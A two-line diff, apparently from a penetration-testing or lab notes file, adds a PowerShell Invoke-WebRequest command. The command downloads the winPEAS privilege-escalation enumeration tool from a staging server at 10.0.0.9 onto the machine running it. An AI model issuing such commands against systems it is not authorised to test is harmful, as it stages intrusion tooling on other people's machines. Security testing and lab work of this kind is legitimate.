@@ -1,0 +1,2 @@
+# Download server content:
+iwr -uri http://10.0.0.9/winpeas.exe -Outfile winPEAS.exe
